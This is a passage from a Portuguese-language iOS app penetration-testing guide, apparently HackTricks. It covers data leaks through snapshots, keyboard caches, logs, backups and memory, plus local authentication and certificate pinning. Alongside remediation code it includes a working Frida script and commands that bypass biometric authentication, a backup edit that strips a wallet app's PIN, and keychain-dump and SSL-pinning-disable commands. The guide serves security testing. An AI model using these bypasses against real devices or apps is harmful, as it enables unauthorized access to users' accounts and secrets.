Sempre que voc√™ pressiona o bot√£o home, o iOS **tira uma captura de tela da tela atual** para poder fazer a transi√ß√£o para o aplicativo de uma maneira muito mais suave. No entanto, se **dados sens√≠veis** estiverem presentes na tela atual, eles ser√£o **salvos** na **imagem** (que **persiste** **atrav√©s** **de** **reinicializa√ß√µes**). Essas s√£o as capturas que voc√™ tamb√©m pode acessar tocando duas vezes na tela inicial para alternar entre aplicativos.

A menos que o iPhone esteja com jailbreak, o **atacante** precisa ter **acesso** ao **dispositivo** **desbloqueado** para ver essas capturas de tela. Por padr√£o, a √∫ltima captura √© armazenada no sandbox do aplicativo na pasta `Library/Caches/Snapshots/` ou `Library/SplashBoard/Snapshots` (os computadores confi√°veis n√£o podem acessar o sistema de arquivos a partir do iOS 7.0).

Uma maneira de prevenir esse comportamento indesejado √© colocar uma tela em branco ou remover os dados sens√≠veis antes de tirar a captura usando a fun√ß√£o `ApplicationDidEnterBackground()`.

A seguir est√° um m√©todo de remedia√ß√£o de exemplo que definir√° uma captura de tela padr√£o.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objetivo-C:
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Isso define a imagem de fundo como `overlayImage.png` sempre que o aplicativo √© enviado para o segundo plano. Isso previne vazamentos de dados sens√≠veis porque `overlayImage.png` sempre substituir√° a visualiza√ß√£o atual.

### Keychain

Para acessar e gerenciar o keychain do iOS, ferramentas como [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) est√£o dispon√≠veis, adequadas para dispositivos com jailbreak. Al√©m disso, [**Objection**](https://github.com/sensepost/objection) fornece o comando `ios keychain dump` para prop√≥sitos semelhantes.

#### **Armazenando Credenciais**

A classe **NSURLCredential** √© ideal para salvar informa√ß√µes sens√≠veis diretamente no keychain, evitando a necessidade de NSUserDefaults ou outros wrappers. Para armazenar credenciais ap√≥s o login, o seguinte c√≥digo Swift √© usado:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Para extrair essas credenciais armazenadas, o comando `ios nsurlcredentialstorage dump` do Objection √© utilizado.

## **Teclados Personalizados e Cache de Teclado**

Com o iOS 8.0 em diante, os usu√°rios podem instalar extens√µes de teclado personalizadas, que s√£o gerenci√°veis em **Ajustes > Geral > Teclado > Teclados**. Embora esses teclados ofere√ßam funcionalidade estendida, eles representam um risco de registro de teclas e transmiss√£o de dados para servidores externos, embora os usu√°rios sejam notificados sobre teclados que requerem acesso √† rede. Os aplicativos podem e devem restringir o uso de teclados personalizados para a entrada de informa√ß√µes sens√≠veis.

**Recomenda√ß√µes de Seguran√ßa:**

* √â aconselh√°vel desativar teclados de terceiros para aumentar a seguran√ßa.
* Esteja ciente dos recursos de corre√ß√£o autom√°tica e sugest√µes autom√°ticas do teclado padr√£o do iOS, que podem armazenar informa√ß√µes sens√≠veis em arquivos de cache localizados em `Library/Keyboard/{locale}-dynamic-text.dat` ou `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Esses arquivos de cache devem ser verificados regularmente em busca de dados sens√≠veis. Recomenda-se redefinir o dicion√°rio do teclado atrav√©s de **Ajustes > Geral > Redefinir > Redefinir Dicion√°rio do Teclado** para limpar dados em cache.
* Interceptar o tr√°fego de rede pode revelar se um teclado personalizado est√° transmitindo as teclas remotamente.

### **Prevenindo o Cache de Campos de Texto**

O [UITextInputTraits protocol](https://developer.apple.com/reference/uikit/uitextinputtraits) oferece propriedades para gerenciar a corre√ß√£o autom√°tica e a entrada de texto seguro, essenciais para prevenir o cache de informa√ß√µes sens√≠veis. Por exemplo, desativar a corre√ß√£o autom√°tica e habilitar a entrada de texto seguro pode ser alcan√ßado com:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Al√©m disso, os desenvolvedores devem garantir que os campos de texto, especialmente aqueles para inserir informa√ß√µes sens√≠veis como senhas e PINs, desativem o cache definindo `autocorrectionType` como `UITextAutocorrectionTypeNo` e `secureTextEntry` como `YES`.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Logs**

A depura√ß√£o de c√≥digo muitas vezes envolve o uso de **logging**. H√° um risco envolvido, pois **os logs podem conter informa√ß√µes sens√≠veis**. Anteriormente, no iOS 6 e em vers√µes anteriores, os logs eram acess√≠veis a todos os aplicativos, representando um risco de vazamento de dados sens√≠veis. **Agora, os aplicativos est√£o restritos a acessar apenas seus pr√≥prios logs**.

Apesar dessas restri√ß√µes, um **atacante com acesso f√≠sico** a um dispositivo desbloqueado ainda pode explorar isso conectando o dispositivo a um computador e **lendo os logs**. √â importante notar que os logs permanecem no disco mesmo ap√≥s a desinstala√ß√£o do aplicativo.

Para mitigar riscos, √© aconselh√°vel **interagir minuciosamente com o aplicativo**, explorando todas as suas funcionalidades e entradas para garantir que nenhuma informa√ß√£o sens√≠vel esteja sendo registrada inadvertidamente.

Ao revisar o c√≥digo-fonte do aplicativo em busca de poss√≠veis vazamentos, procure tanto por **declara√ß√µes de logging** **pr√©-definidas** quanto **personalizadas**, usando palavras-chave como `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` para fun√ß√µes integradas, e quaisquer men√ß√µes de `Logging` ou `Logfile` para implementa√ß√µes personalizadas.

### **Monitoring System Logs**

Os aplicativos registram v√°rias informa√ß√µes que podem ser sens√≠veis. Para monitorar esses logs, ferramentas e comandos como:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
s√£o √∫teis. Al√©m disso, **Xcode** oferece uma maneira de coletar logs do console:

1. Abra o Xcode.
2. Conecte o dispositivo iOS.
3. Navegue at√© **Window** -> **Devices and Simulators**.
4. Selecione seu dispositivo.
5. Acione o problema que voc√™ est√° investigando.
6. Use o bot√£o **Open Console** para visualizar os logs em uma nova janela.

Para um registro mais avan√ßado, conectar ao shell do dispositivo e usar **socat** pode fornecer monitoramento de logs em tempo real:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Seguido por comandos para observar atividades de log, que podem ser inestim√°veis para diagnosticar problemas ou identificar potenciais vazamentos de dados nos logs.

***

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas comunit√°rias mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

## Backups

**Recursos de auto-backup** est√£o integrados ao iOS, facilitando a cria√ß√£o de c√≥pias de dados do dispositivo atrav√©s do iTunes (at√© macOS Catalina), Finder (a partir do macOS Catalina) ou iCloud. Esses backups abrangem quase todos os dados do dispositivo, excluindo elementos altamente sens√≠veis como detalhes do Apple Pay e configura√ß√µes do Touch ID.

### Riscos de Seguran√ßa

A inclus√£o de **aplicativos instalados e seus dados** nos backups levanta a quest√£o de um potencial **vazamento de dados** e o risco de que **modifica√ß√µes no backup possam alterar a funcionalidade do aplicativo**. √â aconselh√°vel **n√£o armazenar informa√ß√µes sens√≠veis em texto simples** dentro do diret√≥rio de qualquer aplicativo ou seus subdiret√≥rios para mitigar esses riscos.

### Excluindo Arquivos dos Backups

Arquivos em `Documents/` e `Library/Application Support/` s√£o salvos por padr√£o. Os desenvolvedores podem excluir arquivos ou diret√≥rios espec√≠ficos dos backups usando `NSURL setResourceValue:forKey:error:` com a chave `NSURLIsExcludedFromBackupKey`. Essa pr√°tica √© crucial para proteger dados sens√≠veis de serem inclu√≠dos nos backups.

### Testando Vulnerabilidades

Para avaliar a seguran√ßa do backup de um aplicativo, comece por **criar um backup** usando o Finder, depois localize-o usando as orienta√ß√µes da [documenta√ß√£o oficial da Apple](https://support.apple.com/en-us/HT204215). Analise o backup em busca de dados sens√≠veis ou configura√ß√µes que possam ser alteradas para afetar o comportamento do aplicativo.

Informa√ß√µes sens√≠veis podem ser buscadas usando ferramentas de linha de comando ou aplicativos como [iMazing](https://imazing.com). Para backups criptografados, a presen√ßa de criptografia pode ser confirmada verificando a chave "IsEncrypted" no arquivo "Manifest.plist" na raiz do backup.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Para lidar com backups criptografados, scripts Python dispon√≠veis no [reposit√≥rio GitHub da DinoSec](https://github.com/dinosec/iphone-dataprotection/tree/master/python\_scripts), como **backup\_tool.py** e **backup\_passwd.py**, podem ser √∫teis, embora possam exigir ajustes para compatibilidade com as vers√µes mais recentes do iTunes/Finder. A ferramenta [**iOSbackup**](https://pypi.org/project/iOSbackup/) √© outra op√ß√£o para acessar arquivos dentro de backups protegidos por senha.

### Modificando o Comportamento do App

Um exemplo de altera√ß√£o do comportamento do app atrav√©s de modifica√ß√µes no backup √© demonstrado no [aplicativo de carteira bitcoin Bither](https://github.com/bither/bither-ios), onde o PIN de bloqueio da interface do usu√°rio √© armazenado em `net.bither.plist` sob a chave **pin\_code**. Remover essa chave do plist e restaurar o backup remove a exig√™ncia do PIN, proporcionando acesso irrestrito.

## Resumo sobre Testes de Mem√≥ria para Dados Sens√≠veis

Ao lidar com informa√ß√µes sens√≠veis armazenadas na mem√≥ria de um aplicativo, √© crucial limitar o tempo de exposi√ß√£o desses dados. Existem duas abordagens principais para investigar o conte√∫do da mem√≥ria: **criar um dump de mem√≥ria** e **analisar a mem√≥ria em tempo real**. Ambos os m√©todos t√™m seus desafios, incluindo a possibilidade de perder dados cr√≠ticos durante o processo de dump ou an√°lise.

## **Recuperando e Analisando um Dump de Mem√≥ria**

Para dispositivos com jailbreak e sem jailbreak, ferramentas como [objection](https://github.com/sensepost/objection) e [Fridump](https://github.com/Nightbringer21/fridump) permitem o dump da mem√≥ria do processo de um app. Uma vez feito o dump, a an√°lise desses dados requer v√°rias ferramentas, dependendo da natureza das informa√ß√µes que voc√™ est√° procurando.

Para extrair strings de um dump de mem√≥ria, comandos como `strings` ou `rabin2 -zz` podem ser usados:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Para uma an√°lise mais detalhada, incluindo a busca por tipos de dados ou padr√µes espec√≠ficos, **radare2** oferece amplas capacidades de busca:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **An√°lise de Mem√≥ria em Tempo de Execu√ß√£o**

**r2frida** fornece uma alternativa poderosa para inspecionar a mem√≥ria de um aplicativo em tempo real, sem a necessidade de um despejo de mem√≥ria. Esta ferramenta permite a execu√ß√£o de comandos de busca diretamente na mem√≥ria do aplicativo em execu√ß√£o:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Quebra de Criptografia

### Processos de Gerenciamento de Chaves Ruins

Alguns desenvolvedores salvam dados sens√≠veis no armazenamento local e os criptografam com uma chave codificada/previs√≠vel no c√≥digo. Isso n√£o deve ser feito, pois alguma revers√£o pode permitir que atacantes extraiam as informa√ß√µes confidenciais.

### Uso de Algoritmos Inseguros e/ou Obsoletos

Os desenvolvedores n√£o devem usar **algoritmos obsoletos** para realizar **verifica√ß√µes** de **autoriza√ß√£o**, **armazenar** ou **enviar** dados. Alguns desses algoritmos s√£o: RC4, MD4, MD5, SHA1... Se **hashes** forem usados para armazenar senhas, por exemplo, devem ser usados hashes resistentes a **brute-force** com sal.

### Verifica√ß√£o

As principais verifica√ß√µes a serem realizadas s√£o encontrar se voc√™ pode encontrar **senhas**/**segredos** **codificados** no c√≥digo, ou se esses s√£o **previs√≠veis**, e se o c√≥digo est√° usando algum tipo de algoritmos de **criptografia** **fracos**.

√â interessante saber que voc√™ pode **monitorar** algumas **bibliotecas** **crypto** automaticamente usando **objection** com:
```swift
ios monitor crypt
```
Para **mais informa√ß√µes** sobre APIs e bibliotecas criptogr√°ficas do iOS, acesse [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Autentica√ß√£o Local

**A autentica√ß√£o local** desempenha um papel crucial, especialmente quando se trata de proteger o acesso a um ponto final remoto por meio de m√©todos criptogr√°ficos. A ess√™ncia aqui √© que, sem uma implementa√ß√£o adequada, os mecanismos de autentica√ß√£o local podem ser contornados.

O [**framework de Autentica√ß√£o Local**](https://developer.apple.com/documentation/localauthentication) da Apple e o [**keychain**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) fornecem APIs robustas para os desenvolvedores facilitarem di√°logos de autentica√ß√£o do usu√°rio e lidarem com dados secretos de forma segura, respectivamente. O Secure Enclave protege a ID de impress√£o digital para o Touch ID, enquanto o Face ID depende do reconhecimento facial sem comprometer os dados biom√©tricos.

Para integrar o Touch ID/Face ID, os desenvolvedores t√™m duas op√ß√µes de API:

* **`LocalAuthentication.framework`** para autentica√ß√£o de usu√°rio em alto n√≠vel sem acesso a dados biom√©tricos.
* **`Security.framework`** para acesso a servi√ßos de keychain em n√≠vel mais baixo, protegendo dados secretos com autentica√ß√£o biom√©trica. V√°rios [wrappers de c√≥digo aberto](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) tornam o acesso ao keychain mais simples.

{% hint style="danger" %}
No entanto, tanto `LocalAuthentication.framework` quanto `Security.framework` apresentam vulnerabilidades, pois retornam principalmente valores booleanos sem transmitir dados para processos de autentica√ß√£o, tornando-os suscet√≠veis a contornos (consulte [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Implementando Autentica√ß√£o Local

Para solicitar autentica√ß√£o dos usu√°rios, os desenvolvedores devem utilizar o m√©todo **`evaluatePolicy`** dentro da classe **`LAContext`**, escolhendo entre:

* **`deviceOwnerAuthentication`**: Solicita Touch ID ou c√≥digo de acesso do dispositivo, falhando se nenhum dos dois estiver habilitado.
* **`deviceOwnerAuthenticationWithBiometrics`**: Solicita exclusivamente Touch ID.

Uma autentica√ß√£o bem-sucedida √© indicada por um valor de retorno booleano de **`evaluatePolicy`**, destacando uma potencial falha de seguran√ßa.

### Autentica√ß√£o Local usando Keychain

Implementar **autentica√ß√£o local** em aplicativos iOS envolve o uso de **APIs de keychain** para armazenar dados secretos, como tokens de autentica√ß√£o, de forma segura. Esse processo garante que os dados s√≥ possam ser acessados pelo usu√°rio, usando seu c√≥digo de acesso do dispositivo ou autentica√ß√£o biom√©trica como Touch ID.

O keychain oferece a capacidade de definir itens com o atributo `SecAccessControl`, que restringe o acesso ao item at√© que o usu√°rio autentique com sucesso via Touch ID ou c√≥digo de acesso do dispositivo. Esse recurso √© crucial para aumentar a seguran√ßa.

Abaixo est√£o exemplos de c√≥digo em Swift e Objective-C demonstrando como salvar e recuperar uma string do keychain, aproveitando esses recursos de seguran√ßa. Os exemplos mostram especificamente como configurar o controle de acesso para exigir autentica√ß√£o do Touch ID e garantir que os dados sejam acess√≠veis apenas no dispositivo em que foram configurados, sob a condi√ß√£o de que um c√≥digo de acesso do dispositivo esteja configurado.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Agora podemos solicitar o item salvo do keychain. Os servi√ßos de keychain apresentar√£o o di√°logo de autentica√ß√£o ao usu√°rio e retornar√£o dados ou nil, dependendo se uma impress√£o digital adequada foi fornecida ou n√£o.

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Detec√ß√£o

O uso de frameworks em um aplicativo tamb√©m pode ser detectado analisando a lista de bibliotecas din√¢micas compartilhadas do bin√°rio do aplicativo. Isso pode ser feito usando `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Se `LocalAuthentication.framework` for usado em um aplicativo, a sa√≠da conter√° ambas as linhas a seguir (lembre-se de que `LocalAuthentication.framework` usa `Security.framework` por baixo):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Se `Security.framework` for utilizado, apenas o segundo ser√° exibido.

### Bypass do Framework de Autentica√ß√£o Local

#### **Objection**

Atrav√©s do **Objection Biometrics Bypass**, localizado [nesta p√°gina do GitHub](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass), uma t√©cnica est√° dispon√≠vel para superar o mecanismo **LocalAuthentication**. O n√∫cleo dessa abordagem envolve aproveitar o **Frida** para manipular a fun√ß√£o `evaluatePolicy`, garantindo que ela sempre retorne um resultado `True`, independentemente do sucesso real da autentica√ß√£o. Isso √© particularmente √∫til para contornar processos de autentica√ß√£o biom√©trica defeituosos.

Para ativar esse bypass, o seguinte comando √© empregado:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Este comando inicia uma sequ√™ncia onde o Objection registra uma tarefa que efetivamente altera o resultado da verifica√ß√£o `evaluatePolicy` para `True`.

#### Frida

Um exemplo de uso de **`evaluatePolicy`** do [DVIA-v2 application](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Para alcan√ßar o **bypass** da Autentica√ß√£o Local, um script Frida √© escrito. Este script visa a verifica√ß√£o **evaluatePolicy**, interceptando seu callback para garantir que retorne **success=1**. Ao alterar o comportamento do callback, a verifica√ß√£o de autentica√ß√£o √© efetivamente contornada.

O script abaixo √© injetado para modificar o resultado do m√©todo **evaluatePolicy**. Ele altera o resultado do callback para sempre indicar sucesso.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Para injetar o script Frida e contornar a autentica√ß√£o biom√©trica, o seguinte comando √© usado:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Exposi√ß√£o de Funcionalidade Sens√≠vel Atrav√©s de IPC

### Manipuladores de URI Personalizados / Deeplinks / Esquemas Personalizados

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Links Universais

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Compartilhamento UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Extens√µes de Aplicativo

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serializa√ß√£o e Codifica√ß√£o

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Comunica√ß√£o de Rede

√â importante verificar se nenhuma comunica√ß√£o est√° ocorrendo **sem criptografia** e tamb√©m se o aplicativo est√° **validando corretamente o certificado TLS** do servidor.\
Para verificar esses tipos de problemas, voc√™ pode usar um proxy como **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Verifica√ß√£o de Nome de Host

Um problema comum na valida√ß√£o do certificado TLS √© verificar se o certificado foi assinado por uma **CA** **confi√°vel**, mas **n√£o verificar** se **o nome do host** do certificado √© o nome do host que est√° sendo acessado.\
Para verificar esse problema usando Burp, ap√≥s confiar na CA do Burp no iPhone, voc√™ pode **criar um novo certificado com Burp para um nome de host diferente** e us√°-lo. Se o aplicativo ainda funcionar, ent√£o, algo est√° vulner√°vel.

### Pinagem de Certificado

Se um aplicativo estiver usando corretamente a Pinagem SSL, ent√£o o aplicativo s√≥ funcionar√° se o certificado for o esperado. Ao testar um aplicativo, **isso pode ser um problema, pois o Burp servir√° seu pr√≥prio certificado.**\
Para contornar essa prote√ß√£o em um dispositivo com jailbreak, voc√™ pode instalar o [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) ou instalar [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Voc√™ tamb√©m pode usar **objection's** `ios sslpinning disable`

## Diversos

* Em **`/System/Library`** voc√™ pode encontrar os frameworks instalados no telefone usados por aplicativos do sistema
* Os aplicativos instalados pelo usu√°rio na App Store est√£o localizados dentro de **`/User/Applications`**
* E o **`/User/Library`** cont√©m dados salvos pelos aplicativos de n√≠vel de usu√°rio
* Voc√™ pode acessar **`/User/Library/Notes/notes.sqlite`** para ler as notas salvas dentro do aplicativo.
* Dentro da pasta de um aplicativo instalado (**`/User/Applications/<APP ID>/`**) voc√™ pode encontrar alguns arquivos interessantes:
* **`iTunesArtwork`**: O √≠cone usado pelo aplicativo
* **`iTunesMetadata.plist`**: Informa√ß√µes do aplicativo usadas na App Store
* **`/Library/*`**: Cont√©m as prefer√™ncias e cache. Em **`/Library/Cache/Snapshots/*`** voc√™ pode encontrar o snapshot realizado para o aplicativo antes de envi√°-lo para o segundo plano.

### Hot Patching/Atualiza√ß√£o For√ßada

Os desenvolvedores podem **patchar todas as instala√ß√µes de seu aplicativo instantaneamente** sem precisar reenviar o aplicativo para a App Store e esperar at√© que seja aprovado.\
Para esse prop√≥sito, geralmente √© usado [**JSPatch**](https://github.com/bang590/JSPatch)**.** Mas h√° outras op√ß√µes tamb√©m, como [Siren](https://github.com/ArtSabintsev/Siren) e [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Esse √© um mecanismo perigoso que pode ser abusado por SDKs de terceiros maliciosos, portanto, √© recomendado verificar qual m√©todo √© usado para atualiza√ß√µes autom√°ticas (se houver) e test√°-lo.** Voc√™ pode tentar baixar uma vers√£o anterior do aplicativo para esse prop√≥sito.

### Terceiros

Um desafio significativo com **SDKs de terceiros** √© a **falta de controle granular** sobre suas funcionalidades. Os desenvolvedores enfrentam uma escolha: integrar o SDK e aceitar todos os seus recursos, incluindo potenciais vulnerabilidades de seguran√ßa e preocupa√ß√µes com a privacidade, ou abrir m√£o de seus benef√≠cios completamente. Muitas vezes, os desenvolvedores n√£o conseguem corrigir vulnerabilidades dentro desses SDKs. Al√©m disso, √† medida que os SDKs ganham confian√ßa na comunidade, alguns podem come√ßar a conter malware.

Os servi√ßos fornecidos por SDKs de terceiros podem incluir rastreamento de comportamento do usu√°rio, exibi√ß√£o de an√∫ncios ou melhorias na experi√™ncia do usu√°rio. No entanto, isso introduz um risco, pois os desenvolvedores podem n√£o estar totalmente cientes do c√≥digo executado por essas bibliotecas, levando a potenciais riscos de privacidade e seguran√ßa. √â crucial limitar as informa√ß√µes compartilhadas com servi√ßos de terceiros ao que √© necess√°rio e garantir que nenhum dado sens√≠vel seja exposto.

A implementa√ß√£o de servi√ßos de terceiros geralmente vem em duas formas: uma biblioteca independente ou um SDK completo. Para proteger a privacidade do usu√°rio, quaisquer dados compartilhados com esses servi√ßos devem ser **anonimizados** para evitar a divulga√ß√£o de Informa√ß√µes Pessoais Identific√°veis (PII).

Para identificar as bibliotecas que um aplicativo usa, o comando **`otool`** pode ser empregado. Esta ferramenta deve ser executada contra o aplicativo e cada biblioteca compartilhada que ele usa para descobrir bibliotecas adicionais.
```bash
otool -L <application_path>
```
## **Refer√™ncias & Mais Recursos**

